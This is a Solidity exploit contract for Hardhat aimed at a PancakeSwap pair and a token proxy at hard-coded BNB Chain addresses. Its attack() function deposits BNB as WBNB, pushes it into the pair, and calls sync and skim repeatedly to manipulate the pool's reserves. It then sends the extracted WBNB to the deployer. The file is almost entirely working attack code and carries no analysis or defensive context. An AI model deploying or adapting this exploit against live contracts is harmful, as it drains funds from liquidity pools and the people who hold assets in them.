//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface IPancakeSwap {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
}
interface IERC20 {
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function decimals() view external returns (uint8);
    function burn(address account, uint256 amount) external;
}

interface IWBNB {
    function deposit() external payable;
    function withdraw(uint) external;
    function approve(address, uint) external returns (bool);
    function transfer(address , uint ) external returns (bool);
    function balanceOf(address) external returns(uint256);
}
contract Exploit {

    IPancakeSwap pair = IPancakeSwap(0x02b0551B656509754285eeC81eE894338E14C5DD);
    
    //This is a proxy 
    IERC20 vulnerableToken = IERC20(0xF40d33DE6737367A1cCB0cE6a056698D993A17E1);
    
    IWBNB WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    address deployer;

    constructor(){
         deployer = msg.sender;
    }

    function attack() public payable{

        WBNB.deposit{value: msg.value}();
        console.log("Before deposit to WBNB, the WBNB balance is: ", WBNB.balanceOf(address(this)));
        WBNB.transfer(0x02b0551B656509754285eeC81eE894338E14C5DD, WBNB.balanceOf(address(this)));
        console.log(WBNB.balanceOf(address(this)));
        pair.sync();
        pair.skim(address(this));
        console.log("skim succeed and the Burger amount is:", vulnerableToken.balanceOf(address(this)));


        //vulnerableToken.burn(0x02b0551B656509754285eeC81eE894338E14C5DD, 2000000000000000000000000);

        vulnerableToken.transfer(0x02b0551B656509754285eeC81eE894338E14C5DD, vulnerableToken.balanceOf(address(this)));
        pair.sync();
        pair.skim(address(this));

        WBNB.transfer(deployer, WBNB.balanceOf(address(this)));
    }



    
}
